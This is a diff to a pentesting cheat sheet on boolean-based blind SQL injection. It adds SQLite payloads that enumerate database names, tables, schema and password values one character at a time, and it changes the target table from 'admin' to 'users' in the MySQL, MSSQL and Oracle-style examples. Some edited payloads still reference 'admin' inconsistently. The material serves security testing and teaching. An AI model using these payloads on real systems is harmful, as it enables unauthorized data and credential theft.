@@ -104,7 +104,27 @@ Second, retrieve the database name:
 {% endtab %}
 
 {% tab title="SQLite" %}
+Principal database is call `main`, but It's possible that multiple database file are open, you can find their name's lenght like this :
+
 ```sql
+1' AND (SELECT LENGTH(name) FROM pragma_database_list LIMIT 1 OFFSET 0)=1--  #False  
+1' AND (SELECT LENGTH(name) FROM pragma_database_list LIMIT 1 OFFSET 0)=2--  #False
+1' AND (SELECT LENGTH(name) FROM pragma_database_list LIMIT 1 OFFSET 0)=3--  #True ->length of first database is 3 characters.
+
+1' AND (SELECT LENGTH(name) FROM pragma_database_list LIMIT 1 OFFSET 1)=3--  #True -> It means the length of second database is 3 characters.
+```
+
+Second, retrieve the name of database:
+
+```sql
+--True -> It means the first character of second database's name is p.
+1' AND (SELECT hex(substr(name,1,1)) FROM pragma_database_list LIMIT 1 OFFSET 1)=HEX('p')-- 
+
+--True -> It means the second character is s.
+1' AND (SELECT hex(substr(name,2,1)) FROM pragma_database_list LIMIT 1 OFFSET 1)=HEX('s')--
+
+--True -> It means the third character is s.
+1' AND (SELECT hex(substr(name,3,1)) FROM pragma_database_list LIMIT 1 OFFSET 1)=HEX('s')--
 ```
 {% endtab %}
 {% endtabs %}
@@ -242,8 +262,33 @@ Third, retrieve name of each table
 {% endtab %}
 
 {% tab title="SQLite" %}
+First, retrieve the number of tables:
+
 ```sql
+1' AND (SELECT COUNT(tbl_name) FROM sqlite_master WHERE type='table' and tbl_name not like 'sqlite_%')=2-- #True -> 2 tables
 ```
+
+Second, retrieve length of each table
+
+```sql
+-- If True, the first table lenght is 5
+1' AND (SELECT LENGTH(tbl_name) FROM sqlite_master WHERE type='table' and tbl_name not like 'sqlite_%' LIMIT 1 OFFSET 0)=5--
+
+-- If True, the second table lenght is 5
+1' AND (SELECT LENGTH(tbl_name) FROM sqlite_master WHERE type='table' and tbl_name not like 'sqlite_%' LIMIT 1 OFFSET 1)=5-- 
+```
+
+Third, retrieve name of each table
+
+<pre class="language-sql"><code class="lang-sql">-- If True, the first char of the first table is u
+<strong>1'AND (SELECT HEX(SUBSTR(tbl_name,1,1)) FROM sqlite_master WHERE type='table' and tbl_name not like 'sqlite_%' LIMIT 1 OFFSET 0)=HEX('u')--
+</strong>
+-- If True, the second char of the first table is s
+1'AND (SELECT HEX(SUBSTR(tbl_name,2,1)) FROM sqlite_master WHERE type='table' and tbl_name not like 'sqlite_%' LIMIT 1 OFFSET 0)=HEX('s')--
+
+-- If True, the first char of the second table is p
+1'AND (SELECT HEX(SUBSTR(tbl_name,1,1)) FROM sqlite_master WHERE type='table' and tbl_name not like 'sqlite_%' LIMIT 1 OFFSET 1)=HEX('p')--
+</code></pre>
 {% endtab %}
 {% endtabs %}
 
@@ -381,7 +426,16 @@ Third, retrieve name of each column
 {% endtab %}
 
 {% tab title="SQLite" %}
+Enumeration of colums is a bit differents in SQLite. We have to enum the sqlite\_schema.sql fields that stores SQL text that describes the object. This SQL text is a [CREATE TABLE](https://www.sqlite.org/lang\_createtable.html), [CREATE VIRTUAL TABLE](https://www.sqlite.org/lang\_createvtab.html), [CREATE INDEX](https://www.sqlite.org/lang\_createindex.html), [CREATE VIEW](https://www.sqlite.org/lang\_createview.html), or [CREATE TRIGGER](https://www.sqlite.org/lang\_createtrigger.html) statement that if evaluated against the database file when it is the main database of a [database connection](https://www.sqlite.org/c3ref/sqlite3.html) would recreate the object.&#x20;
+
+We can send the following queries to retrieve it
+
 ```sql
+-- If True, the first char of sql field is C
+1' AND (SELECT HEX(SUBSTR(sql,1,1)) FROM sqlite_master WHERE type!='meta' and sql NOT NULL AND name='TABLE_NAME_HERE')=HEX('C')--
+
+-- If True, the second char of sql field is R
+1' AND (SELECT HEX(SUBSTR(sql,2,1)) FROM sqlite_master WHERE type!='meta' and sql NOT NULL AND name='TABLE_NAME_HERE')=HEX('R')--
 ```
 {% endtab %}
 {% endtabs %}
@@ -393,17 +447,17 @@ Third, retrieve name of each column
 First, retrieve the length of the value (we take password column as example):
 
 ```sql
-1' AND (SELECT LENGTH(password) FROM admin LIMIT 0,1)=9-- -  #True -> 1st password is 9 char
+1' AND (SELECT LENGTH(password) FROM users LIMIT 0,1)=9-- -  #True -> 1st password is 9 char
 ```
 
 Second, retrieve values
 
 ```sql
 -- If True, the first password's char is p
-1'AND (SELECT HEX(SUBSTRING(password, 1, 1))FROM admin LIMIT 0,1)=HEX('p')-- -
+1'AND (SELECT HEX(SUBSTRING(password, 1, 1))FROM users LIMIT 0,1)=HEX('p')-- -
 
 -- If True, the second password's char is a
-1'AND (SELECT HEX(SUBSTRING(password, 2, 1))FROM admin LIMIT 0,1)=HEX('a')-- -
+1'AND (SELECT HEX(SUBSTRING(password, 2, 1))FROM users LIMIT 0,1)=HEX('a')-- -
 ```
 {% endtab %}
 
@@ -412,26 +466,26 @@ First, retrieve the length of the value (we take password column as example):
 
 ```sql
 -- True -> 1st password is 9 char
-1' AND (SELECT TOP 1 LEN(password) FROM admin)=9--
+1' AND (SELECT TOP 1 LEN(password) FROM users)=9--
 
 -- True -> 2st password is 9 char
-1' AND (SELECT TOP 1 LEN(password) FROM admin WHERE password NOT IN(SELECT TOP 1 password FROM admin))=9--
+1' AND (SELECT TOP 1 LEN(password) FROM users WHERE password NOT IN(SELECT TOP 1 password FROM admin))=9--
 ```
 
 Second, retrieve values
 
 ```sql
 -- If True, the first password's char is p
-1'AND (SELECT TOP 1 ASCII(SUBSTRING(password, 1, 1))FROM admin)=112--
+1'AND (SELECT TOP 1 ASCII(SUBSTRING(password, 1, 1))FROM users)=112--
 
 -- If True, the second password's char is a
-1'AND (SELECT TOP 1 ASCII(SUBSTRING(password, 2, 1))FROM admin)=97--
+1'AND (SELECT TOP 1 ASCII(SUBSTRING(password, 2, 1))FROM users)=97--
 
 -- If True, the first char of second password is p
-1'AND (SELECT TOP 1 ASCII(SUBSTRING(password, 1, 1))FROM admin WHERE password NOT IN(SELECT TOP 1 password FROM admin))=112--
+1'AND (SELECT TOP 1 ASCII(SUBSTRING(password, 1, 1))FROM users WHERE password NOT IN(SELECT TOP 1 password FROM admin))=112--
 
 -- If True, the second char of second password is p
-1'AND (SELECT TOP 1 ASCII(SUBSTRING(password, 2, 1))FROM admin WHERE password NOT IN(SELECT TOP 1 password FROM admin))=97--
+1'AND (SELECT TOP 1 ASCII(SUBSTRING(password, 2, 1))FROM users WHERE password NOT IN(SELECT TOP 1 password FROM admin))=97--
 ```
 {% endtab %}
 
@@ -439,17 +493,17 @@ Second, retrieve values
 First, retrieve the length of the value (we take password column as example):
 
 ```sql
-1' AND (SELECT LENGTH(password) FROM admin OFFSET 0 ROWS FETCH NEXT 1 ROWS ONLY)=9--  #True -> 1st password is 9 char
+1' AND (SELECT LENGTH(password) FROM users OFFSET 0 ROWS FETCH NEXT 1 ROWS ONLY)=9--  #True -> 1st password is 9 char
 ```
 
 Second, retrieve values
 
 ```sql
 -- If True, the first password's char is p
-1'AND (SELECT ASCII(SUBSTR(password, 1, 1)) FROM admin OFFSET 0 ROWS FETCH NEXT 1 ROWS ONLY)=112--
+1'AND (SELECT ASCII(SUBSTR(password, 1, 1)) FROM users OFFSET 0 ROWS FETCH NEXT 1 ROWS ONLY)=112--
 
 -- If True, the second password's char is a
-1'AND (SELECT ASCII(SUBSTR(password, 2, 1)) FROM admin OFFSET 0 ROWS FETCH NEXT 1 ROWS ONLY)=97--
+1'AND (SELECT ASCII(SUBSTR(password, 2, 1)) FROM users OFFSET 0 ROWS FETCH NEXT 1 ROWS ONLY)=97--
 ```
 {% endtab %}
 
@@ -457,22 +511,35 @@ Second, retrieve values
 First, retrieve the length of the value (we take password column as example):
 
 ```sql
-1' AND (SELECT LENGTH(password) FROM admin LIMIT 0,1)=9--  #True -> 1st password is 9 char
+1' AND (SELECT LENGTH(password) FROM users LIMIT 0,1)=9--  #True -> 1st password is 9 char
 ```
 
 Second, retrieve values
 
 ```sql
 -- If True, the first password's char is p
-1'AND (SELECT ASCII(SUBSTRING(password, 1, 1))FROM admin LIMIT 0,1)=112--
+1'AND (SELECT ASCII(SUBSTRING(password, 1, 1))FROM users LIMIT 0,1)=112--
 
 -- If True, the second password's char is a
-1'AND (SELECT ASCII(SUBSTRING(password, 2, 1))FROM admin LIMIT 0,1)=97--
+1'AND (SELECT ASCII(SUBSTRING(password, 2, 1))FROM users LIMIT 0,1)=97--
 ```
 {% endtab %}
 
 {% tab title="SQLite" %}
+First, retrieve the length of the value (we take password column as example):
+
 ```sql
+1' AND (SELECT LENGTH(password) FROM users LIMIT 1 OFFSET 0)=9--  #True -> 1st password is 9 char
+```
+
+Second, retrieve values
+
+```sql
+-- If True, the first char of first password is p
+1'AND (SELECT HEX(SUBSTR(password, 1, 1)) FROM users LIMIT 1 OFFSET 0)=HEX('p')--
+
+-- If True, the second char of first password is a
+1'AND (SELECT HEX(SUBSTR(password, 2, 1)) FROM users LIMIT 1 OFFSET 0)=HEX('a')
 ```
 {% endtab %}
 {% endtabs %}
